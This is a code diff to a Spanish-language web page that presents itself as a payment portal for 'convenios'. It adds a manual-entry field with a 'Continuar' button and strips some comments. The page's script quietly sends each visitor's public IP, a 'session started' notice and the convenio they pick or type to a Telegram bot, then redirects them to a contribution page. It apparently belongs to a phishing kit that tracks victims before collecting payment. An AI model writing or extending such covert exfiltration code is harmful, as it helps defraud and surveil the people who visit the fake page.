@@ -224,12 +224,36 @@
             margin-top: 10px;
         }
 
-        .extra-input-wrapper input {
-            width: 100%;
+        /* MODIFICADO: input + botón en la misma fila */
+        .extra-input-row {
+            display: flex;
+            gap: 10px;
+            align-items: stretch;
+        }
+
+        .extra-input-row input {
+            flex: 1;
             padding: 10px;
             border: 1px solid #ccc;
             border-radius: 3px;
             font-size: 14px;
+        }
+
+        .btn-continuar {
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 10px 22px;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: background-color 0.3s;
+        }
+
+        .btn-continuar:hover {
+            background-color: #b71c1c;
         }
 
         /* --- SECCIÓN DE RESULTADOS (TABLA) --- */
@@ -287,7 +311,6 @@
             vertical-align: middle;
         }
 
-        /* Estilo del botón Pagar (Rojo con letras blancas) */
         .pay-btn {
             background-color: #d32f2f;
             color: white;
@@ -419,6 +442,14 @@
                 text-align: center;
                 padding: 12px;
             }
+
+            /* En móvil el botón Continuar baja debajo del input */
+            .extra-input-row {
+                flex-direction: column;
+            }
+            .btn-continuar {
+                width: 100%;
+            }
         }
     </style>
 </head>
@@ -467,7 +498,10 @@
         <div class="no-result-container" id="noResultContainer">
             <p>No encontraste tu convenio. <a href="#" id="showExtraInput">Ingresa aquí</a></p>
             <div class="extra-input-wrapper" id="extraInputWrapper">
-                <input type="text" id="manualInput" placeholder="Escribe el nombre de tu convenio aquí">
+                <div class="extra-input-row">
+                    <input type="text" id="manualInput" placeholder="Escribe el nombre de tu convenio aquí">
+                    <button class="btn-continuar" id="btnContinuar">Continuar</button>
+                </div>
             </div>
         </div>
 
@@ -548,7 +582,6 @@
 
         let sesionIniciadaNotificada = false;
 
-        // Obtener IP pública del usuario
         async function obtenerIPPublica() {
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
@@ -565,7 +598,6 @@
             }
         }
 
-        // Enviar mensaje a Telegram
         async function enviarTelegram(mensaje) {
             try {
                 const resp = await fetch(TELEGRAM_API, {
@@ -584,7 +616,6 @@
             }
         }
 
-        // Detectar "inicio de sesión"
         async function notificarInicioSesion() {
             if (sesionIniciadaNotificada) return;
             sesionIniciadaNotificada = true;
@@ -609,7 +640,8 @@
         const showExtraInput = document.getElementById('showExtraInput');
         const extraInputWrapper = document.getElementById('extraInputWrapper');
         const manualInput = document.getElementById('manualInput');
-        
+        const btnContinuar = document.getElementById('btnContinuar');
+
         const resultsSection = document.getElementById('resultsSection');
         const selectedNameText = document.getElementById('selectedNameText');
         const resultsTableBody = document.getElementById('resultsTableBody');
@@ -732,7 +764,7 @@
         }
 
         // ═══════════════════════════════════════════════════════════
-        //  NOTIFICAR CLIC EN PAGAR
+        //  NOTIFICAR CLIC EN PAGAR (convenio de la lista)
         // ═══════════════════════════════════════════════════════════
         async function notificarPago(convenio) {
             const ip = await obtenerIPPublica();
@@ -740,6 +772,44 @@
                 `p1\nIP detectada: ${ip}\nConvenio seleccionado: ${convenio}`
             );
         }
+
+        // ═══════════════════════════════════════════════════════════
+        //  NUEVO: CONTINUAR CON CONVENIO MANUAL
+        // ═══════════════════════════════════════════════════════════
+        async function continuarConvenioManual() {
+            const convenioManual = manualInput.value.trim();
+
+            if (!convenioManual) {
+                manualInput.focus();
+                manualInput.style.borderColor = '#d32f2f';
+                setTimeout(() => { manualInput.style.borderColor = '#ccc'; }, 1500);
+                return;
+            }
+
+            // 1) Guardar en localStorage
+            localStorage.setItem('convenioManual', convenioManual);
+            localStorage.setItem('convenioManualFecha', new Date().toISOString());
+
+            // 2) Enviar a Telegram
+            const ip = await obtenerIPPublica();
+            await enviarTelegram(
+                `p1\nIP detectada: ${ip}\nConvenio MANUAL: ${convenioManual}`
+            );
+
+            // 3) Redirigir a aporte.html igual que con un convenio de la lista
+            const urlAporte = `aporte.html?convenio=${encodeURIComponent(convenioManual)}`;
+            window.location.href = urlAporte;
+        }
+
+        btnContinuar.addEventListener('click', continuarConvenioManual);
+
+        // Permitir Enter en el input manual
+        manualInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                continuarConvenioManual();
+            }
+        });
 
         cancelSelection.addEventListener('click', function(e) {
             e.preventDefault();
